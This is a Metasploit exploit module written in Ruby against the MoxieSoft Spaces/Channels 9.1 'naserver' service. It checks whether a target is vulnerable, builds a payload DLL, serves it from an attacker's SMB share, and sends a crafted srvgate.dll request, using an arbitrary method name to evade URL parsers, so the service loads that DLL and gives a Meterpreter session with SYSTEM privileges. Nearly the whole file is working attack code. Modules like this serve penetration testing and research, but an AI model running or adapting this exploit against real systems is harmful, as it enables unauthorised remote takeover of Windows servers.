##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

# Tested on:
#
# Windows 7/IIS 7.5
# Windows 2003 SP2/IIS 6.0 
# Windows 2008 R2/IIS 7.5

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::SMB::Server::Share
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Moxiesoft NAServer/SrvGate DLL Loading',
      'Description'   => %q{
        This module abuses the "naserver" service on MoxieSoft Spaces/Channels 9.1
        to accomplish arbitrary DLL loading and execute arbitrary code with SYSTEM
        privileges.

        In order to accomplish remote DLL loading it uses an SMB service 
        to ask the naserver process to load a module from a network share.
      },
      'Author'      => [
        'Matthew Hall <hallm@sec-1.com>', # Vulnerability discovery and exploit using SMB
      ],
      'DisclosureDate' => 'Jan 31 2014',
      'Platform'       => 'win',
      'Privileged'     => true,
      'Arch'         => ARCH_X86, # NAServer is a 32-bit process
      'References'     =>
        [
          [ 'URL', 'http://www.sec-1.com/blog/'],
        ],
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => 'false',
          'EXITFUNC' => 'thread', # Need to migrate inside session. meterpreter runs under rundll32
          'InitialAutoRunScript' => 'migrate -f',
        },
      'Privileged'     => true,
      'Platform'       => [ 'win'],
      'Targets'        =>
        [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'SessionTypes'   => [ "meterpreter" ],
      'DefaultTarget'  => 0, # Default target is 32-bit as we usually inject into 32bit processes
      ))
      register_options(
        [
          OptString.new('FILE_NAME', [ false, 'DLL File name to share', 'exploit.dll'])
        ], self.class)
      deregister_options('FILE_CONTENTS')
  end

  def check
    res = send_request_raw({'uri'=>'/netagent/adminasp/adminservice.aspx'}) # Check the base path for version regex
    if res and res.body =~ /Administrator 9\.1/ 
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def primer
    self.file_contents = generate_payload_dll
    print_status("File available on #{unc}...")
    share = "#{unc}".gsub(/\.dll/,'')
    print_status("Injecting DLL to #{datastore['RHOST']}:#{datastore['RPORT']} - #{share}")

    sploit = "/netagent/scripts/srvgate.dll?Action=9099&XMLType=General&Module="
    sploit << share

    res = send_request_raw({
      'method' => 'XXX', # Any method works, use this to evade URL parsers
      'uri' => sploit
    }, 5)

    # Wait 30 seconds for session to be created
    1.upto(30) do
      break if session_created?
      sleep(1)
    end
    disconnect
  end
end
